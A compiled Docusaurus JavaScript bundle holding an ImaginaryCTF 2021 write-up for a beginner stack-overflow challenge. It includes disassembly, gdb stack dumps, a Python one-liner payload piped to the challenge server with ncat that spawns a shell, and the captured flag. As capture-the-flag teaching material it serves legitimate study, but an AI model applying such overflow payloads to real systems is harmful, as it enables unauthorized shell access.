"use strict";(self.webpackChunkwriteups_docs=self.webpackChunkwriteups_docs||[]).push([[6123],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>d});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function f(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var i=r.createContext({}),s=function(e){var t=r.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):f(f({},t),e)),n},c=function(e){var t=s(e.components);return r.createElement(i.Provider,{value:t},e.children)},p="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,i=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),p=s(n),m=a,d=p["".concat(i,".").concat(m)]||p[m]||u[m]||o;return n?r.createElement(d,f(f({ref:t},c),{},{components:n})):r.createElement(d,f({ref:t},c))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,f=new Array(o);f[0]=m;var l={};for(var i in t)hasOwnProperty.call(t,i)&&(l[i]=t[i]);l.originalType=e,l[p]="string"==typeof e?e:a,f[1]=l;for(var s=2;s<o;s++)f[s]=n[s];return r.createElement.apply(null,f)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},4423:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>f,default:()=>p,frontMatter:()=>o,metadata:()=>l,toc:()=>s});var r=n(7462),a=(n(7294),n(3905));const o={},f="STACKOVERFLOW",l={unversionedId:"2021/IMAGINARYCTF/challenges/stackoverflow",id:"2021/IMAGINARYCTF/challenges/stackoverflow",title:"STACKOVERFLOW",description:"- File : stackoverflow",source:"@site/docs/2021/IMAGINARYCTF/challenges/stackoverflow.md",sourceDirName:"2021/IMAGINARYCTF/challenges",slug:"/2021/IMAGINARYCTF/challenges/stackoverflow",permalink:"/writeups-docs/docs/2021/IMAGINARYCTF/challenges/stackoverflow",draft:!1,editUrl:"https://github.com/pynard/writeups-docs/tree/main/docs/2021/IMAGINARYCTF/challenges/stackoverflow.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"SPELLING_TEST",permalink:"/writeups-docs/docs/2021/IMAGINARYCTF/challenges/spelling_test"},next:{title:"STINGS",permalink:"/writeups-docs/docs/2021/IMAGINARYCTF/challenges/stings"}},i={},s=[],c={toc:s};function p(e){let{components:t,...n}=e;return(0,a.kt)("wrapper",(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"stackoverflow"},"STACKOVERFLOW"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Description\nWelcome to Stack Overflow! Get answers to all your programming questions right here!\n\nAttachments\nhttps://imaginaryctf.org/r/E795-stackoverflow nc chal.imaginaryctf.org 42001\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"File : ",(0,a.kt)("a",{parentName:"li",href:"../attachements/stackoverflow/stackoverflow"},"stackoverflow"))),(0,a.kt)("p",null,"Upon connection via ncat we obtain a greeting message and we have to input text :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?\na\nThanks! Now onto the posts!\nERROR: FEATURE NOT IMPLEMENTED YET\n")),(0,a.kt)("p",null,"So we need to type the right sequence of char to obtain the flag."),(0,a.kt)("p",null,"By inspecting the binary we see a ",(0,a.kt)("strong",{parentName:"p"},"cmp "),"instruction after the ",(0,a.kt)("strong",{parentName:"p"},"scanf")," instruction :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'[...]\n\u2502           0x00000825      e866feffff     call sym.imp.__isoc99_scanf\n\u2502           0x0000082a      488d3d750100.  lea rdi, str.Thanks__Now_onto_the_posts_ ; 0x9a6 ; "Thanks! Now onto the posts!"\n\u2502           0x00000831      e82afeffff     call sym.imp.puts\n\u2502           0x00000836      48817df86674.  cmp qword [var_8h], 0x69637466\n\u2502       \u250c\u2500< 0x0000083e      751f           jne 0x85f\n\u2502       \u2502   0x00000840      488d3d7b0100.  lea rdi, str.DEBUG_MODE_ACTIVATED. ; 0x9c2 ; "DEBUG MODE ACTIVATED."\n\u2502       \u2502   0x00000847      e814feffff     call sym.imp.puts\n\u2502       \u2502   0x0000084c      488d3d850100.  lea rdi, str._bin_sh        ; 0x9d8 ; "/bin/sh"\n\u2502       \u2502   0x00000853      b800000000     mov eax, 0\n\u2502       \u2502   0x00000858      e813feffff     call sym.imp.system\n\u2502      \u250c\u2500\u2500< 0x0000085d      eb0c           jmp 0x86b\n\u2502      \u2502\u2502   ; CODE XREF from main @ 0x83e\n\u2502      \u2502\u2514\u2500> 0x0000085f      488d3d7a0100.  lea rdi, str.ERROR:_FEATURE_NOT_IMPLEMENTED_YET ; 0x9e0 ; "ERROR: FEATURE NOT IMPLEMENTED YET"\n\u2502      \u2502    0x00000866      e8f5fdffff     call sym.imp.puts\n\u2502      \u2502    ; CODE XREF from main @ 0x85d\n\u2502      \u2514\u2500\u2500> 0x0000086b      b800000000     mov eax, 0\n\u2502           0x00000870      c9             leave\n\u2514           0x00000871      c3             ret\n')),(0,a.kt)("p",null,"we need to avoid the ",(0,a.kt)("strong",{parentName:"p"},"jne")," at ",(0,a.kt)("strong",{parentName:"p"},"0x83e")," in order to get to the ",(0,a.kt)("strong",{parentName:"p"},"system('/bin/sh')")," at ",(0,a.kt)("strong",{parentName:"p"},"0x858")),(0,a.kt)("p",null,'With gdb we see that the comparison is done between whatever is written at rbp-0x8 and 0x69637466 (= "ictf" in ascii ) :'),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"=> 0x555555400836 <main+124>:    cmp    QWORD PTR [rbp-0x8],0x69637466\n")),(0,a.kt)("p",null,"at ",(0,a.kt)("strong",{parentName:"p"},"rbp-0x8")," is written ",(0,a.kt)("strong",{parentName:"p"},"BBBB")," we must rewrite it with a buffer overflow :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"[-------------------------------------code-------------------------------------]\n   0x555555400825 <main+107>:    call   0x555555400690 <__isoc99_scanf@plt>\n   0x55555540082a <main+112>:    lea    rdi,[rip+0x175]        # 0x5555554009a6\n   0x555555400831 <main+119>:    call   0x555555400660 <puts@plt>\n=> 0x555555400836 <main+124>:    cmp    QWORD PTR [rbp-0x8],0x69637466\n   0x55555540083e <main+132>:    jne    0x55555540085f <main+165>\n   0x555555400840 <main+134>:    lea    rdi,[rip+0x17b]        # 0x5555554009c2\n   0x555555400847 <main+141>:    call   0x555555400660 <puts@plt>\n   0x55555540084c <main+146>:    lea    rdi,[rip+0x185]        # 0x5555554009d8\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffe100 --\x3e 0x42424242 ('AAAA')\n0008| 0x7fffffffe108 --\x3e 0x555555400880 (<__libc_csu_init>:    push   r15)\n0016| 0x7fffffffe110 --\x3e 0x0 \n0024| 0x7fffffffe118 --\x3e 0x5555554006b0 (<_start>:    xor    ebp,ebp)\n0032| 0x7fffffffe120 --\x3e 0x7fffffffe220 --\x3e 0x1 \n0040| 0x7fffffffe128 --\x3e 0x42424242 ('BBBB')\n0048| 0x7fffffffe130 --\x3e 0x0 \n0056| 0x7fffffffe138 --\x3e 0x7ffff7dfab25 (<__libc_start_main+213>:    mov    edi,eax)\n[------------------------------------------------------------------------------]\n")),(0,a.kt)("p",null,"Here I typed ",(0,a.kt)("strong",{parentName:"p"},"AAAA")," ( @0x7fffffffe100 on the stack ) and we need to overflow ",(0,a.kt)("strong",{parentName:"p"},"BBBB")," ( @0x7fffffffe128 ) with ",(0,a.kt)("strong",{parentName:"p"},"ictf")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"0x7fffffffe128 - 0x7fffffffe100 = 40 buffer chars")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"+ ftci")," (backward because of little-endianness )"),(0,a.kt)("p",null,"The solution is :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ( python -c \"print('A'*40+'ftci')\" ; cat ) | ncat chal.imaginaryctf.org 42001  \n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?\nThanks! Now onto the posts!\nDEBUG MODE ACTIVATED.\nls\nflag.txt\nrun\ncat flag.txt\nictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}\n")),(0,a.kt)("p",null,"flag : ",(0,a.kt)("inlineCode",{parentName:"p"},"ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}")))}p.isMDXComponent=!0}}]);